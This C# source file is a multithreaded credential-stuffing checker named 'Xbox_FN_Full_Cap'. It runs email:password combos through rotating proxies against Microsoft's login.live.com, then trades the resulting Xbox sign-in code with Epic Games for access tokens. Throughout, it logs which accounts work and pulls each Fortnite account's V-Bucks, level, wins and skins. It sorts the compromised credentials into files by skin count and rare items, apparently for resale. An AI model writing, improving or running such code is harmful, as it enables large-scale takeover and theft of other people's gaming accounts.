using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Collections;

namespace Mailify
{
    internal class Xbox_FN_Full_Cap
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;

            new Thread(() => Variables.XboxFN_FULL_CAP_title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();
            Thread.Sleep(-1);
        
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var req = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    req.Proxy.ConnectTimeout = proxyTimeout;
                    req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));

                    req.AddHeader("accept-encoding", "null");
                    string pre_req = req.Get("https://login.live.com/").ToString();

                    string UAID = Functions.LR(pre_req, "&uaid=", "\"/>").FirstOrDefault();
                    req.AddHeader("accept-encoding", "null");
                    req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                    req.AddHeader("Pragma", "no-cache");
                    req.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                    req.AddHeader("Upgrade-Insecure-Requests", "1");
                    req.AddHeader("Referer", "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1");
                    req.AddHeader("Cookie", "wlidperf=FR=L&ST=1573475967016; MSPShared=1; SDIDC=CavoGthu*pkJAN8Eek6dWr5opN5x1BL2!mueAsRqcHLVS94TF9fJG7M1fnoFg6a*recSzMqgr*rslJH2ICxiqJGNoOHcIMFXc!RLunwBMWhU0x321UT4GCRmUx6DZ7AjzurT*F2lfakG55iffb2VLqMt0mhzOabJGnTjvNhmJC9g1p*grJ8oN9vhRFP1QX!nZ!fWcW27*aTbPPnlAGv9aKLWqL*MazqS52WCQ1qeFZq2cv5ZfnxVwVkgfgjdQvs2GEwfHcnTOQx1uQdtaK9OZwguM8Ck!XoiweJLLeKfFhKRZuntwAkM7ZR0uwP6Z19dR7mBTpGpy5F6!dyrkpKizd9!nzZSFFo*7poLWKhu1rNfXZj1IGgaH9sTsatt8!OJcUye6DGBEO2UgVGMYZSXh3qZLLQfoCt27U2AyIJI2kF!CwX2SD8t9RLWxmz1S3NIVWmBO8wm!DlUH1lpURHmiXbk1m!22SzIKy09LvlGae8GFkF!Rx57Ef2CKW5i5QTBtQ$$; IgnoreCAW=1; MSCC=1571654982; mkt=en-US; optimizelyEndUserId=oeu1572238927711r0.5850160263416339; uaid=e94a49f177664960a3fca122edaf8a27; MSPRequ=id=292543&lt=1573475927&co=1; OParams=11DUe2VlF3OgbQNYrRZRg3REn8KImGd*MjJ03B0XHPylHxLr2YAXrzYNH!J96HFWgoWGEdSPWFdPiET54l8VSW7HH0FPuC0Ce2pxC2uyWUloRhCunIwMUB8QUtvNr0as9T1RluKxlaF5K4LNi7CWjITDPFW2tzU!gS5LVvUdG58wfPg1itYuqY2HKQNrXN51!s!LMD8g2Gf5pcrXZibicJLoN1z5P3XSQm2UhakTdBNoDEruwv8MWbzT!5ImiwMzPP*G5APiiLE!9EKUwPT49z1!ERSbMlpzjFZP25j3o01h!9VuAllBJeaaJeclbcH9QuCwvUd2N3Z6kCiV5jlEKbyfAbHAiIJ6TNAmwU3ftHK08Fy5L6vUHSZRyocbR18FVCoP7lMVfmfQfS41VEmD3JdZTwjJIosaE7!i7E31jx5gwDqYZpo0wjnRzQlt3I9twovyRxbRxuvMVRqN7ey0AE7XI67w70kjUoRg*NbmI2BAxmuNnAdujjs4YlLsdZ8iIIFk73CkQpQ6X!MO58xB09KYImQyevehtDlrXkr*oDQCAh; MSPOK=$uuid-6b855d49-8f09-4e83-8526-b756788bf3b9$uuid-02a3151d-ba2d-4c6c-be88-c9c804ecb043");

                    var res0 = req.Post("https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=eyJ0cmFja2luZ1V1aWQiOiJjZGRiODAxMmQ2NjM0MzJkOTkxOGJmMzIxMjBmMTA5ZCIsImlzUG9wdXAiOnRydWUsImlzV2ViIjp0cnVlLCJvYXV0aFJlZGlyZWN0VXJsIjoiaHR0cHM6Ly9lcGljZ2FtZXMuY29tL2lkL2xvZ2luL3hibD9wcm9tcHQ9IiwiaXAiOiIxOTcuMjYuMTM4LjIxNiIsImlkIjoiNTQxYWYyMGUxMDVjNGI0MGJhNGQxNTRhZTlkMDU2OWQifQ%3D%3D&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup&contextid=611F4D63F80A23E2&bk=1614165077&uaid=" + UAID + "&pid=15216", $"i13=0&login={credentials[0]}&loginfmt={credentials[0]}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={credentials[1]}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DZshWk88CvvuA9vSOHldJLurwIJH4a7uUREfu4fGCsbB2nL*YUw36i0Lz7tZDGptQxZhUTW0%21*ZM3oIUxGKEeEa1gcx%21XzBNiXpzf*U9iH68RaP3u20G0J6k2%21UdeMFc9C9uusE3IwI3gi4u7wJzyq8FCiNuk2Hly66dMuX96mSwHTYXgtZZpS%21rbS35jrsdC%21Ku4UysydsP0MXSz2klYp9KU%21hDHeKBZIu13h%21rQk9jG2vzCW4OerTedipQDJRuAg%24%24&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i2=1&i17=0&i18=&i19=32099", "application/x-www-form-urlencoded");
                    string text0 = res0.ToString();

                    if (res0.Address.ToString().Contains("?code="))
                    {
                        var mr = Functions.LR(res0.Address.ToString(), "?code=", "&state=").FirstOrDefault();
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "*/*");
                        string EPIC_PRE_REQ = req.Get("https://www.epicgames.com/id/api/reputation").ToString();
                        string session = req.Cookies.GetCookies("https://www.epicgames.com/id/api/reputation")["EPIC_SESSION_REPUTATION"].Value;
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "*/*");
                        string EPIC_SECOND_REQ = req.Get("https://www.epicgames.com/id/api/csrf").ToString();
                        var srf = req.Cookies.GetCookies("https://www.epicgames.com/id/api/csrf")["XSRF-TOKEN"].Value;
                        var ap = req.Cookies.GetCookies("https://www.epicgames.com/id/api/csrf")["EPIC_SESSION_AP"].Value;

                        req.ClearAllHeaders();
                        req.AddHeader("POST", "/id/api/external/xbl/login HTTP/1.1");
                        req.AddHeader("Host", "www.epicgames.com");
                        req.AddHeader("Connection", "keep-alive");
                        req.AddHeader("X-Epic-Event-Category", "null");
                        req.AddHeader("X-XSRF-TOKEN", srf);
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 OPR/74.0.3911.107 (Edition utorrent)");
                        req.AddHeader("X-Epic-Event-Action", "null");
                        req.AddHeader("Content-Type", "application/json;charset=UTF-8");
                        req.AddHeader("Accept", "application/json, text/plain, */*");
                        req.AddHeader("X-Requested-With", "XMLHttpRequest");
                        req.AddHeader("X-Epic-Strategy-Flags", "guardianEmailVerifyEnabled=false;guardianKwsFlowEnabled=false;minorPreRegisterEnabled=false");
                        req.AddHeader("Origin", "https://www.epicgames.com");
                        req.AddHeader("Sec-Fetch-Site", "same-origin");
                        req.AddHeader("Sec-Fetch-Mode", "cors");
                        req.AddHeader("Sec-Fetch-Dest", "empty");
                        req.AddHeader("Referer", "https://www.epicgames.com/id/login/xbl?prompt=&extLoginState=eyJ0cmFja2luZ1V1aWQiOiJmN2MxODNkMzczYmQ0NzMxYTMxYjVjN2NlMGViNzE1ZSIsImlzV2ViIjp0cnVlLCJpcCI6IjE5Ny4yNi4xMzguMjE2IiwiaWQiOiIwMjEwYTIyNTcyMjU0ZDYzOTg1ZGFjOGU4NmM4MGVlZSIsImNvZGUiOiJNLlIzX0JBWS5mYzRjZGZjNi1iMTQ5LTNhN2YtYzZmNC1jZWMzY2Y3MDZmMDkifQ%253D%253D");
                        req.AddHeader("Accept-Language", "fr-FR,fr;q=0.9");
                        req.AddHeader("Accept-Encoding", "gzip, deflate");
                        req.AddHeader("Content-Length", "56");
                        var res123 = req.Post("https://www.epicgames.com/id/api/external/xbl/login", "{\"code\":\"" + mr + "\"}", "application/json");
                        string LOGIN_CHECK = res123.ToString();

                        if (LOGIN_CHECK.Contains("no_account_found_for") || Convert.ToInt32(res123.StatusCode) == 400)
                        {
                            Variables.Valid++;
                            Variables.XBOX_Hits++;
                            Variables.Checked++;
                            Variables.cps++;
                            lock (Variables.WriteLock)
                            {
                                Variables.remove(combo);
                                File.AppendAllText(Variables.results + "Xbox_hits.txt", combo + Environment.NewLine);
                            }
                        }
                        else
                        {
                            req.ClearAllHeaders();
                            req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                            req.AddHeader("Pragma", "no-cache");
                            req.AddHeader("Accept", "*/*");
                            var res7 = req.Get("https://www.epicgames.com/id/api/csrf");
                            string text7 = res7.ToString();
                            var XSRF_TOKEN = req.Cookies.GetCookies("https://www.epicgames.com/id/api/csrf")["XSRF-TOKEN"].Value;
                            req.ClearAllHeaders();
                            req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/10.19.9-14892359+++Portal+Release-Live UnrealEngine/4.23.0-14892359+++Portal+Release-Live Chrome/59.0.3071.15 Safari/537.36");
                            req.AddHeader("Pragma", "no-cache");
                            req.AddHeader("Accept", "application/json, text/plain, */*");
                            req.AddHeader("Connection", "keep-alive");
                            req.AddHeader("Accept-Language", "en");
                            req.AddHeader("Origin", "https://www.epicgames.com");
                            req.AddHeader("X-Epic-Event-Action", "login");
                            req.AddHeader("X-Epic-Event-Category", "login");
                            req.AddHeader("X-Epic-Strategy-Flags", "guardianEmailVerifyEnabled=false;guardianKwsFlowEnabled=false;minorPreRegisterEnabled=false");
                            req.AddHeader("X-Requested-With", "XMLHttpRequest");
                            req.AddHeader("X-XSRF-TOKEN", XSRF_TOKEN);
                            req.AddHeader("Referer", "https://www.epicgames.com/id/login/welcome");
                            req.AddHeader("Accept-Encoding", "gzip, deflate");
                            var res8 = req.Post("https://www.epicgames.com/id/api/exchange/generate", "ewewe", "application/x-www-form-urlencoded");
                            string text8 = res8.ToString();
                            if (text8.Contains("You are not authenticated. Please authenticate"))
                            {
                                Variables.Invalid++;
                                Variables.Checked++;
                                Variables.cps++;
                                lock (Variables.WriteLock)
                                {
                                    Variables.remove(combo);
                                }
                            }
                            else if (text8.Contains("\"code\":"))
                            {
                                var code = Functions.JSON(text8, "code").FirstOrDefault();
                                req.AddHeader("User-Agent", "EpicGamesLauncher/10.2.3-7092195+++Portal+Release-Live Windows/10.0.17134.1.768.64bit");
                                req.AddHeader("Pragma", "no-cache");
                                req.AddHeader("Accept", "*/*");
                                req.AddHeader("Authorization", "basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=");

                                var res9 = req.Post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token", "grant_type=exchange_code&exchange_code=" + code + "&token_type=eg1", "application/x-www-form-urlencoded");
                                string text9 = res9.ToString();

                                var eg1 = Functions.JSON(text9, "access_token").FirstOrDefault();
                                var acc_id = Functions.JSON(text9, "account_id").FirstOrDefault();

                                req.AddHeader("User-Agent", "Fortnite/++Fortnite+Release-8.51-CL-6165369 Windows/10.0.17763.1.256.64bit");
                                req.AddHeader("Pragma", "no-cache");
                                req.AddHeader("Accept", "*/*");
                                req.AddHeader("Authorization", "bearer " + eg1 + "");

                                var res10 = req.Post("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/" + acc_id + "/client/QueryProfile?profileId=common_core&rvn=-1", "{\"{}\":\"\"}", "application/json");
                                string text10 = res10.ToString();

                                var VBucks = Functions.LR(text10, "templateId\":\"Currency:MtxGiveaway\",\"attributes\":{\"platform\":\"Shared\"},\"quantity\":", "},").FirstOrDefault();

                                req.AddHeader("User-Agent", "EpicGamesLauncher/10.2.3-7092195+++Portal+Release-Live Windows/10.0.17134.1.768.64bit");
                                req.AddHeader("Pragma", "no-cache");
                                req.AddHeader("Accept", "*/*");
                                req.AddHeader("Authorization", "bearer " + eg1 + "");

                                var res11 = req.Post("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/" + acc_id + "/client/QueryProfile?profileId=athena&rvn=-1", "{}", "application/json");
                                string text11 = res11.ToString();
                                var AccountLevel = Functions.LR(text11, "\"accountLevel\":", ",\"").FirstOrDefault();
                                var TotalWins = Functions.LR(text11, "lifetime_wins\":", ",").FirstOrDefault();

                                var Capture = " | VBucks: " + VBucks + " | Account Level: " + AccountLevel + " | Total Wins: " + TotalWins;

                                List<string> Skins = new List<string>();
                                List<string> Pickaxes = new List<string>();

                                foreach (object obj in Mailify.Translater.Skins)
                                {
                                    DictionaryEntry skin = (DictionaryEntry)obj;
                                    if (text11.Contains(skin.Key.ToString()))
                                    {
                                        Skins.Add(skin.Value.ToString());
                                    }
                                    else
                                    {
                                    }
                                }
                                foreach (object obj in Mailify.Translater.Pickaxes)
                                {
                                    DictionaryEntry Pickaxe = (DictionaryEntry)obj;
                                    if (text11.Contains(Pickaxe.Key.ToString()))
                                    {
                                        Pickaxes.Add(Pickaxe.Value.ToString());
                                    }
                                    else
                                    {
                                    }
                                }

                                string Skins_Capture = string.Join(",", Skins.ToArray());
                                string PickAxe_Capture = string.Join(",", Pickaxes.ToArray());
                                string Skins_Capture1 = string.Join(Environment.NewLine, Skins.ToArray());
                                string PickAxe_Capture1 = string.Join(Environment.NewLine, Pickaxes.ToArray());

                                Variables.Valid++;
                                Variables.FN_Hits++;
                                Variables.Checked++;
                                Variables.cps++;
                                lock (Variables.WriteLock)
                                {
                                    Variables.remove(combo);
                                    if (Skins.Count != 0)
                                    {
                                        Variables.Skinned++;
                                        File.AppendAllText(Variables.skins + "Total-Skinned.txt", combo + " | Skins: " + Skins.Count + Environment.NewLine);
                                        File.AppendAllText(Variables.results + "Full-Capture.txt", "-------------------------------------------------------------------------" + Environment.NewLine + Environment.NewLine + "Credentials - " + combo + Environment.NewLine + Environment.NewLine + "General Capture - " + Capture  + " | Total skins: " + Skins.Count + Environment.NewLine + Environment.NewLine + "======================SKINS====================" + Environment.NewLine + Skins_Capture1 + Environment.NewLine + Environment.NewLine + "===================PICKAXE'S==================" + Environment.NewLine + PickAxe_Capture1 + Environment.NewLine + Environment.NewLine);
                                        if (Skins.Count >= 300)
                                        {
                                            Variables.three_hundred_over++;
                                            File.AppendAllText(Variables.skins + "300+.txt", combo + Environment.NewLine);
                                        }
                                        else if (Skins.Count >= 200)
                                        {
                                            Variables.two_hundred_to_three_hundred++;
                                            File.AppendAllText(Variables.skins + "200-300.txt", combo + Environment.NewLine);
                                        }
                                        else if (Skins.Count >= 100)
                                        {
                                            Variables.one_hundred_to_two_hundred++;
                                            File.AppendAllText(Variables.skins + "100-200.txt", combo + Environment.NewLine);
                                        }
                                        else if (Skins.Count >= 50)
                                        {
                                            Variables.fifty_to_one_hundred++;
                                            File.AppendAllText(Variables.skins + "50-100.txt", combo + Environment.NewLine);
                                        }
                                        else if (Skins.Count >= 25)
                                        {
                                            Variables.twenty_five_to_fifty++;
                                            File.AppendAllText(Variables.skins + "25-50.txt", combo + Environment.NewLine);
                                        }
                                        else if (Skins.Count >= 10)
                                        {
                                            Variables.ten_to_twentyfive++;
                                            File.AppendAllText(Variables.skins + "10-25.txt", combo + Environment.NewLine);
                                        }
                                        else
                                        {
                                            Variables.one_to_10++;
                                            File.AppendAllText(Variables.skins + "1-10.txt", combo + Environment.NewLine);
                                        }
                                        //RARES
                                        if (Skins.Contains("blackknight"))
                                        {
                                            Variables.Rares++;
                                            File.AppendAllText(Variables.rares + $"BlackKnight.txt", combo + Environment.NewLine);
                                        }
                                        if (Skins.Contains("bluesquire"))
                                        {
                                            Variables.Rares++;
                                            File.AppendAllText(Variables.rares + $"BlueSquire.txt", combo + Environment.NewLine);
                                        }
                                        if (Skins.Contains("renegaderaider"))
                                        {
                                            Variables.Rares++;
                                            File.AppendAllText(Variables.rares + $"RenegadeRaider.txt", combo + Environment.NewLine);
                                        }
                                        if (Skins.Contains("redknight"))
                                        {
                                            Variables.Rares++;
                                            File.AppendAllText(Variables.rares + $"RedKnight.txt", combo + Environment.NewLine);
                                        }
                                        if (Skins.Contains("ikonik"))
                                        {
                                            Variables.Rares++;
                                            File.AppendAllText(Variables.rares + $"Ikonic.txt", combo + Environment.NewLine);
                                        }
                                        if (Skins.Contains("aerialassaulttrooper"))
                                        {
                                            Variables.Rares++;
                                            File.AppendAllText(Variables.rares + $"AerialAssaultTrooper.txt", combo + Environment.NewLine);
                                        }
                                        if (Skins.Contains("reflex"))
                                        {
                                            Variables.Rares++;
                                            File.AppendAllText(Variables.rares + $"Reflex.txt", combo + Environment.NewLine);
                                        }
                                        if (Skins.Contains("ghoultrooper"))
                                        {
                                            Variables.Rares++;
                                            File.AppendAllText(Variables.rares + $"GhoulTrooper.txt", combo + Environment.NewLine);
                                        }
                                        if (Skins.Contains("galaxy"))
                                        {
                                            Variables.Rares++;
                                            File.AppendAllText(Variables.rares + $"Galaxy.txt", combo + Environment.NewLine);
                                        }
                                        if (Pickaxes.Contains("raider's revenge"))
                                        {
                                            Variables.Rares++;
                                            File.AppendAllText(Variables.rares + $"RaidersRevenge.txt", combo + Environment.NewLine);

                                        }
                                        if (Skins.Contains("wonder"))
                                        {
                                            Variables.Rares++;
                                            File.AppendAllText(Variables.rares + $"Wonder.txt", combo + Environment.NewLine);
                                        }
                                        if (Skins.Contains("reconexpert"))
                                        {
                                            Variables.Rares++;
                                            File.AppendAllText(Variables.rares + $"ReconExpert.txt", combo + Environment.NewLine);
                                        }
                                        if (Skins.Contains("codenamee.l.f."))
                                        {
                                            Variables.Rares++;
                                            File.AppendAllText(Variables.rares + $"CodenameElf.txt", combo + Environment.NewLine);
                                        }
                                    }
                                    else
                                    {
                                        Variables.No_Skins++;
                                        File.AppendAllText(Variables.skins + "No-Skins.txt", combo + Capture + Environment.NewLine);
                                    }
                                    File.AppendAllText(Variables.vbucks + $"{VBucks}.txt", combo + Environment.NewLine);
                                    File.AppendAllText(Variables.results + $"No Cap.txt", combo + Environment.NewLine);
                                    File.AppendAllText(Variables.results + $"Total_hits.txt", combo + Capture + $" | Total Skins: {Skins.Count} - Skins: " + Skins_Capture + " | PickAxe's: " + PickAxe_Capture + Environment.NewLine);

                                    lock (Variables.WriteLock)
                                    {
                                        if (Config.kekr_UI == "LOG")
                                        {
                                            Console.WriteLine($"[+] {combo}", Color.Green);
                                        }
                                        
                                    }
                                }
                            }
                        }
                    }
                    else if (text0.Contains("account doesn\\'t exist.") || text0.Contains("incorrect") || text0.Contains("Please enter the password for your Microsoft account."))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                        }
                    }
                    else if (text0.Contains("action=\"https://account.live.com/recover") || text0.Contains("action=\"https://account.live.com/Abuse") || text0.Contains("action=\"https://account.live.com/ar/cancel") || text0.Contains("action=\"https://account.live.com/identity/confirm") || text0.Contains("title>Help us protect your account") || text0.Contains("action=\"https://account.live.com/RecoverAccount") || text0.Contains("action=\"https://account.live.com/Email/Confirm") || text0.Contains("action=\"https://account.live.com/Email/Confirm") || text0.Contains("action=\"https://account.live.com/Abuse") || text0.Contains("action=\"https://account.live.com/profile/accrue"))
                    {
                        Variables.Custom++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }

                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}